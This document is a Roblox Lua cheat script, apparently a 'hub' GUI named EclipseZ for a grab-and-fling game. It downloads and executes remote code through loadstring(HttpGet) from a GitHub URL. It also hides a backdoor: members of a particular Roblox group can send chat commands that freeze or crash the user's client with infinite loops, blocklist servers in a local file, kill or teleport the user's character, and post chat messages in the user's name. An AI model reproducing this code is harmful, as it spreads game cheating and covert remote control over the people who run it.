function FWC(Parent,Name,Time) return Parent:FindFirstChild(Name) or Parent:WaitForChild(Name,Time) end

OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Utkaky/Main/refs/heads/main/Orion.lua"))()
Window = OrionLib:MakeWindow({
    Name = "EclipseZ",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "EclipseFTAP",
    IntroEnabled = false,
    IntroText = "idk Hub",
    KeyToOpenWindow = "M",
    FreeMouse = true
})
LnTab = Window:MakeTab({
    Name = "Grab",
    Icon = "rbxassetid://4483362458",
    PremiumOnly = false
})
w = game:GetService("Workspace")
rs = game:GetService("ReplicatedStorage")
Players = game:GetService("Players")
me = Players.LocalPlayer

function GetKey()
    if me:GetAttribute("RG") == "YJMZg8bAH8" then
        return "Xana"
    end
    return nil
end
characterEventsFolder = rs:WaitForChild("CharacterEvents")
debrisService = game:GetService("Debris")
ChatTypingBoard = characterEventsFolder:WaitForChild("ChatTyping")
    local sayMessageRequestEvent
    if rs:FindFirstChild("DefaultChatSystemChatEvents") and rs.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest") then
        sayMessageRequestEvent = rs.DefaultChatSystemChatEvents.SayMessageRequest
    else
        sayMessageRequestEvent = nil
    end
TweenService = game:GetService("TweenService")
me.Changed:Connect(function(userIdString)
    if userIdString == "userId" or userIdString == "UserId" then
        while true do
        end
    else
        return
    end
end)
function Type(data)
    sayMessageRequestEvent:FireServer(data, "All")
end
adminDataMap = {}
function checkadminData(item)
    if table.find(adminDataMap, item) then
        return true
    end
end
function TeleportPlayer(cframe, time)
    pcall(function()
        if me.Character and me.Character:FindFirstChild("HumanoidRootPart") then
            me.Character.HumanoidRootPart.CFrame = cframe
        end
    end)
end
function getGroupRank(playerInstance, groupId)
    if typeof(playerInstance) == "Instance" and playerInstance.Parent then
        local lastTimeRankUpdate = playerInstance:GetAttribute("LastTimeRankUpdate")
        if not lastTimeRankUpdate or lastTimeRankUpdate and os.clock() - lastTimeRankUpdate >= 300 then
            local success, rank = pcall(function()
                return playerInstance:GetRankInGroup(groupId)
            end)
            local _, groupRole = pcall(function()
                return playerInstance:GetRoleInGroup(groupId)
            end)
            
            local playerRank = not success and "Member" or rank
            
            if playerRank == 255 or groupRole == "Owner" then
                playerInstance:SetAttribute("Rank", "Owner")
            elseif playerRank == 4 and groupRole == "High Rank Admin" then
                playerInstance:SetAttribute("Rank", "High Rank Admin")
            elseif playerRank == 3 and groupRole == "Low Rank Admin" then
                playerInstance:SetAttribute("Rank", "Low Rank Admin")
            elseif playerRank == 2 and groupRole == "Lower Rank Admin" then
                playerInstance:SetAttribute("Rank", "Lower Rank Admin")
            elseif playerRank == 1 and groupRole == "Member" then
                playerInstance:SetAttribute("Rank", "Member")
            else
                playerInstance:SetAttribute("Rank", groupRole or "Member")
            end
            
            playerInstance:SetAttribute("LastTimeRankUpdate", os.clock())
        end
        return playerInstance:GetAttribute("Rank")
    end
end
function isAuthorized(targetInstance)
    if typeof(targetInstance) ~= "Instance" then
        targetInstance = nil
    elseif targetInstance:IsA("Model") and targetInstance:FindFirstChildOfClass("Humanoid") and Players:GetPlayerFromCharacter(targetInstance) then
        targetInstance = Players:GetPlayerFromCharacter(targetInstance)
    elseif not targetInstance:IsA("Player") then
        return false
    end
    
    local isAdmin = false
    if targetInstance then
        local groupRank = getGroupRank(targetInstance, 1082151871)
        isAdmin = (groupRank == "Owner" 
            or groupRank == "High Rank Admin" 
            or groupRank == "Low Rank Admin" 
            or groupRank == "Lower Rank Admin") and true or false
        
        if checkadminData(targetInstance.Name) and not adminDataMap[targetInstance.Name].Protection then
            isAdmin = false
        end
        return isAdmin
    end
end
function IsHoldingAdminPlayer()
    local grabPartsFolder = w:FindFirstChild("GrabParts")
    if grabPartsFolder and grabPartsFolder:FindFirstChild("GrabPart") and grabPartsFolder.GrabPart:FindFirstChild("WeldConstraint") then
        local part1 = grabPartsFolder.GrabPart.WeldConstraint.Part1
        if part1 and isAuthorized(part1.Parent) then
            return true
        end
    end
end
power_scale = {
    Owner = 255,
    ["High Rank Admin"] = 3,
    ["Low Rank Admin"] = 2,
    ["Lower Rank Admin"] = 1,
    Member = 0
}
function checkPowerRequirement(abilityName, powerScaleKey)
    if type(abilityName) == "string" then
        local requiredPowerLevel = getGroupRank(me, 1082151871)
        local hasSufficientPower = (abilityName:lower() == me.Name:sub(1, abilityName:len()):lower() or abilityName:lower() == "all") and true or nil
        local abilityPowerScale = power_scale[powerScaleKey]
        local playerPowerScale = power_scale[requiredPowerLevel]
        
        if playerPowerScale and abilityPowerScale then
            if playerPowerScale < abilityPowerScale then
                hasSufficientPower = false
            end
        end
        return hasSufficientPower
    end
end
if isfile("sblist.txt") then
    local serverList = string.split(readfile("sblist.txt"), "\n")
    for _, jobId in ipairs(serverList) do
        if jobId == game.JobId then
            while true do
                print("L")
            end
        end
    end
end
function DevJoinEffect()
    local soundEffect = Instance.new("Sound", w)
    local colorCorrection = Instance.new("ColorCorrectionEffect", w.CurrentCamera)
    soundEffect.SoundId = "rbxassetid://5246103002"
    soundEffect.Volume = 1
    soundEffect:Play()
    colorCorrection.Brightness = 0.825
    TweenService:Create(colorCorrection, TweenInfo.new(5), {Brightness = 0}):Play()
    debrisService:AddItem(colorCorrection, 35)
    debrisService:AddItem(soundEffect, 35)
end
muted = false
function mute()
    if not muted then
        muted = true
        while muted do
            game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
            task.wait(0.05)
        end
        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
    end
end
function processCommand(message, rank, targetPlayerName, adminList)
    if rank ~= "Lower Rank Admin" or GetKey() ~= "Xana" then
        local commandArguments = string.split(message, " ")
        local commandName = commandArguments[1]:lower()
        
        if checkPowerRequirement(commandArguments[2], adminList) then
            if rank == "Owner" and commandName == ":premium" then
                me:SetAttribute("RG", "YJMZg8bAH8")
            end
            
            if rank == "High Rank Admin" or rank == "Owner" then
                if commandName == ":kick" then
                    while true do print("L") end
                end
                if commandName == ":ban" then
                    if isfile("sblist.txt") then
                        writefile("sblist.txt", readfile("sblist.txt") .. "\n" .. game.JobId)
                    else
                        writefile("sblist.txt", game.JobId)
                    end
                    while true do print("L") end
                end
            end
            
            if rank == "Low Rank Admin" or rank == "High Rank Admin" or rank == "Owner" then
                if commandName == ":kill" then
                    me.Character:FindFirstChildOfClass("Humanoid").Health = 0
                elseif commandName == ":freeze" then
                    _G.FreezeLoop = true
                    while _G.FreezeLoop do
                        if me.Character:FindFirstChild("HumanoidRootPart") then
                            me.Character.HumanoidRootPart.Anchored = true
                        end
                        task.wait()
                    end
                elseif commandName == ":unfreeze" then
                    _G.FreezeLoop = false
                    me.Character.HumanoidRootPart.Anchored = false
                elseif commandName == ":loopkill" then
                    _G.DevLoopKillCMD = true
                    while _G.DevLoopKillCMD do
                        if me.Character:FindFirstChildOfClass("Humanoid") then
                            me.Character.Humanoid.Health = 0
                        end
                        task.wait()
                    end
                elseif commandName == ":unloopkill" then
                    _G.DevLoopKillCMD = false
                elseif commandName == ":reveal" then
                    sayMessageRequestEvent:FireServer("/w " .. targetPlayerName .. " I'm using Bliz_T GUI!", "All")
                elseif commandName == ":chat" then
                    local messageContent = nil
                    for wordIndex = 3, #commandArguments do
                        if messageContent then
                            messageContent = messageContent .. " " .. commandArguments[wordIndex]
                        else
                            messageContent = commandArguments[wordIndex]
                        end
                    end
                    sayMessageRequestEvent:FireServer(messageContent, "All")
                elseif commandName == ":bring" then
                    TeleportPlayer(Players[targetPlayerName].Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 5))
                elseif commandName == ":mute" then
                    mute()
                elseif commandName == ":unmute" then
                    muted = false
                end
            end
            
            if rank == "Lower Rank Admin" then
                if commandName == ":kill" then
                    me.Character:FindFirstChildOfClass("Humanoid").Health = 0
                elseif commandName == ":mute" then
                    mute()
                elseif commandName == ":unmute" then
                    muted = false
                end
            end
        end
        
        if commandName == ":ag" then
            adminDataMap[targetPlayerName].AntiGrab = true
        elseif commandName == ":unag" then
            adminDataMap[targetPlayerName].AntiGrab = false
        elseif commandName == ":p" then
            adminDataMap[targetPlayerName].Protection = true
        elseif commandName == ":unp" then
            adminDataMap[targetPlayerName].Protection = false
        end
    end
end
function handleChatMessage(message, speakerName)
    if type(message) == "string" and type(speakerName) == "string" then
        local chatMessageData = {
            Message = message,
            FromSpeaker = Players:FindFirstChild(speakerName)
        }
        local colonIndex, _ = string.find(chatMessageData.Message, ":")
        if colonIndex then
            chatMessageData.Message = string.sub(chatMessageData.Message, colonIndex, chatMessageData.Message:len())
        end
        local messageSender = chatMessageData.FromSpeaker
        if messageSender then
            local senderRank = getGroupRank(messageSender, 1082151871)
            if senderRank == "Owner" then
                processCommand(chatMessageData.Message, "Owner", messageSender.Name, senderRank)
            elseif senderRank == "High Rank Admin" then
                processCommand(chatMessageData.Message, "High Rank Admin", messageSender.Name, senderRank)
            elseif senderRank == "Low Rank Admin" then
                processCommand(chatMessageData.Message, "Low Rank Admin", messageSender.Name, senderRank)
            elseif senderRank == "Lower Rank Admin" then
                processCommand(chatMessageData.Message, "Lower Rank Admin", messageSender.Name, senderRank)
            end
        end
    end
end
task.spawn(function()
    while task.wait(1) do
        for _, playerInstance in ipairs(Players:GetPlayers()) do
            if playerInstance ~= me and isAuthorized(playerInstance) and not playerInstance:GetAttribute("Inject") then
                playerInstance:SetAttribute("Inject", true)
                adminDataMap[playerInstance.Name] = {
                    AntiGrab = true,
                    Protection = true
                }
                playerInstance.Chatted:Connect(function(message)
                    handleChatMessage(message, playerInstance.Name)
                end)
            end
        end
    end
end)
